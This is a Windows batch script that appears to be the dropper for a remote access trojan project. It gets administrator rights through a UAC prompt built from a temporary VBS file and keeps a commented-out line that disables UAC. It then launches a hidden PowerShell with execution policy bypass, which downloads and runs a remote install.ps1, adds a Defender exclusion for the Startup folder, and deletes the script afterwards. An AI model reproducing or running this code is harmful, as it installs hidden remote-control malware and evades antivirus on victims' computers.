REM get admin permissions for script
@echo off
:: BatchGotAdmin
:-------------------------------------
REM  --> check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> if error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

REM Disable UAC Totally
@REM New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force


REM disable defender

REM rat resources

REM Download and execute the installer script in an isolated environment, no connection with the parent pwsh
powershell -noP -ep bypass start-process powershell.exe -windowstyle hidden " {iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/files/install.ps1' -outfile '.\install.ps1';Add-MpPreference -ExclusionPath 'C:\Users\%AppData%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup';.\install.ps1}"
@REM powershell -ep bypass -noP start-process powershell.exe -windowstyle hidden ".\install.ps1"

del wget.cmd